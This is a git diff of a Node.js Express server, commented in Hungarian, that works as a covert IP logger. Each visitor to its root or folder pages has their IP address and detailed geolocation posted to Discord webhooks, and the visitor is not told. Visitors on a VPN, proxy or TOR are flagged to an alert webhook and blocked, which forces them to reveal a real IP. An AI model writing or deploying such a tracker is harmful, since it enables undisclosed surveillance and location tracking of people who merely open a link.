@@ -11,18 +11,18 @@ const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
 const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
 const PROXYCHECK_API_KEY = process.env.PROXYCHECK_API_KEY;
 
-// ---- FŐ LOG format ----
-function mainFormat(folderName, ip, geo) {
+// TELJES LOG (FO LOG) -- ITT MINDEN INFÓT KÜLD
+function formatGeoDataTeljes(geo) {
+  if (!geo || Object.keys(geo).length === 0) return '**Ismeretlen adatok**';
   return (
-    `**Oldal:** /${folderName}\n` +
-    `**IP-cím:** ${ip}\n` +
+    `**IP-cím:** ${geo.ip || 'Ismeretlen'}\n` +
     `**Sikeres lekérdezés:** ${geo.success || 'Ismeretlen'}\n` +
     `**Típus:** ${geo.type || 'Ismeretlen'}\n` +
     `**Kontinens:** ${geo.continent || 'Ismeretlen'}\n` +
     `**Kontinens kód:** ${geo.continent_code || 'Ismeretlen'}\n` +
     `**Ország:** ${geo.country || 'Ismeretlen'}\n` +
     `**Országkód:** ${geo.country_code || 'Ismeretlen'}\n` +
-    // Zászló szövegként nincs!
+    `**Ország zászló:** ${geo.country_flag || 'Ismeretlen'}\n` +
     `**Főváros:** ${geo.country_capital || 'Ismeretlen'}\n` +
     `**Ország hívószám:** ${geo.country_phone || 'Ismeretlen'}\n` +
     `**Szomszédos országok:** ${geo.country_neighbours || 'Ismeretlen'}\n` +
@@ -46,18 +46,18 @@ function mainFormat(folderName, ip, geo) {
   );
 }
 
-// ---- VPN LOG format ----
-function vpnFormat(folderName, ip, geo) {
+// VPN/PROXY LOG -- EZT IS MINDENNEL TÖLTJÜK KI, később törölhetsz belőle bármelyiket
+function formatGeoDataVpn(geo) {
+  if (!geo || Object.keys(geo).length === 0) return '**Ismeretlen adatok**';
   return (
-    `**Oldal:** /${folderName}\n` +
-    `**IP-cím:** ${ip}\n` +
+    `**IP-cím:** ${geo.ip || 'Ismeretlen'}\n` +
     `**Sikeres lekérdezés:** ${geo.success || 'Ismeretlen'}\n` +
     `**Típus:** ${geo.type || 'Ismeretlen'}\n` +
     `**Kontinens:** ${geo.continent || 'Ismeretlen'}\n` +
     `**Kontinens kód:** ${geo.continent_code || 'Ismeretlen'}\n` +
     `**Ország:** ${geo.country || 'Ismeretlen'}\n` +
     `**Országkód:** ${geo.country_code || 'Ismeretlen'}\n` +
-    // Zászló szövegként nincs!
+    `**Ország zászló:** ${geo.country_flag || 'Ismeretlen'}\n` +
     `**Főváros:** ${geo.country_capital || 'Ismeretlen'}\n` +
     `**Ország hívószám:** ${geo.country_phone || 'Ismeretlen'}\n` +
     `**Szomszédos országok:** ${geo.country_neighbours || 'Ismeretlen'}\n` +
@@ -81,19 +81,18 @@ function vpnFormat(folderName, ip, geo) {
   );
 }
 
-// ---- GYANÚS TEVÉKENYSÉG LOG format ----
-function riasztoFormat(page, reason, ip, geo) {
+// RIASZTÁS/ROSSZ KOMBINÁCIÓ LOG -- SZINTÉN MINDEN INFÓVAL
+function formatGeoDataReport(geo) {
+  if (!geo || Object.keys(geo).length === 0) return '**Ismeretlen adatok**';
   return (
-    `**Oldal:** ${page || 'Ismeretlen'}\n` +
-    `**Művelet:** ${reason}\n` +
-    `**IP-cím:** ${ip}\n` +
+    `**IP-cím:** ${geo.ip || 'Ismeretlen'}\n` +
     `**Sikeres lekérdezés:** ${geo.success || 'Ismeretlen'}\n` +
     `**Típus:** ${geo.type || 'Ismeretlen'}\n` +
     `**Kontinens:** ${geo.continent || 'Ismeretlen'}\n` +
     `**Kontinens kód:** ${geo.continent_code || 'Ismeretlen'}\n` +
     `**Ország:** ${geo.country || 'Ismeretlen'}\n` +
     `**Országkód:** ${geo.country_code || 'Ismeretlen'}\n` +
-    // Zászló szövegként nincs!
+    `**Ország zászló:** ${geo.country_flag || 'Ismeretlen'}\n` +
     `**Főváros:** ${geo.country_capital || 'Ismeretlen'}\n` +
     `**Ország hívószám:** ${geo.country_phone || 'Ismeretlen'}\n` +
     `**Szomszédos országok:** ${geo.country_neighbours || 'Ismeretlen'}\n` +
@@ -161,6 +160,50 @@ async function isVpnProxy(ip) {
   }
 }
 
+// --- FŐOLDAL logolása (szaby néven, pl. szaby.com/) ---
+app.get('/', async (req, res) => {
+  const folderName = 'szaby';
+  const ip = getClientIp(req);
+  const geoData = await getGeo(ip);
+
+  // FŐ WEBHOOK LOG (ország, város, IP stb.)
+  axios.post(MAIN_WEBHOOK, {
+    username: "Helyszíni Naplózó <3",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: '',
+    embeds: [{
+      title: 'Új látogató az oldalon!',
+      description: `**Oldal:** /${folderName}\n` +
+                   formatGeoDataTeljes(geoData),
+      color: 0x800080
+    }]
+  }).catch(()=>{});
+
+  // VPN/PROXY ellenőrzés és ALERT log
+  if (await isVpnProxy(ip)) {
+    axios.post(ALERT_WEBHOOK, {
+      username: "VPN figyelő <3",
+      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+      content: '',
+      embeds: [{
+        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
+        description: `**Oldal:** /${folderName}\n` +
+                     formatGeoDataVpn(geoData),
+        color: 0xff0000
+      }]
+    }).catch(()=>{});
+    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
+  }
+
+  // index.html visszaadása (public/szaby/index.html)
+  const filePath = path.join(__dirname, 'public', folderName, 'index.html');
+  if (fs.existsSync(filePath)) {
+    res.sendFile(filePath);
+  } else {
+    res.status(404).send('404 Not Found');
+  }
+});
+
 // --- Dinamikus oldalak: pl. /szaby, /kecske, /barmi ---
 app.get('/:folder', async (req, res, next) => {
   const folderName = req.params.folder;
@@ -174,16 +217,16 @@ app.get('/:folder', async (req, res, next) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
 
-  // FŐ WEBHOOK LOG
+  // FŐ WEBHOOK LOG (ország, város, IP stb.)
   axios.post(MAIN_WEBHOOK, {
     username: "Helyszíni Naplózó <3",
     avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
     content: '',
     embeds: [{
       title: 'Új látogató az oldalon!',
-      description: mainFormat(folderName, ip, geoData),
-      color: 0x800080,
-      thumbnail: geoData.country_flag ? { url: geoData.country_flag } : undefined
+      description: `**Oldal:** /${folderName}\n` +
+                   formatGeoDataTeljes(geoData),
+      color: 0x800080
     }]
   }).catch(()=>{});
 
@@ -195,9 +238,9 @@ app.get('/:folder', async (req, res, next) => {
       content: '',
       embeds: [{
         title: 'VPN/proxy vagy TOR-ral próbálkozás!',
-        description: vpnFormat(folderName, ip, geoData),
-        color: 0xff0000,
-        thumbnail: geoData.country_flag ? { url: geoData.country_flag } : undefined
+        description: `**Oldal:** /${folderName}\n` +
+                     formatGeoDataVpn(geoData),
+        color: 0xff0000
       }]
     }).catch(()=>{});
     return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
@@ -219,9 +262,11 @@ app.post('/report', express.json(), async (req, res) => {
     content: '',
     embeds: [{
       title: 'Gyanús tevékenység!',
-      description: riasztoFormat(page, reason, ip, geoData),
-      color: 0xff0000,
-      thumbnail: geoData.country_flag ? { url: geoData.country_flag } : undefined
+      description:
+        `**Oldal:** ${page || 'Ismeretlen'}\n` +
+        `**Művelet:** ${reason}\n` +
+        formatGeoDataReport(geoData),
+      color: 0xff0000
     }]
   }).catch(()=>{});
 
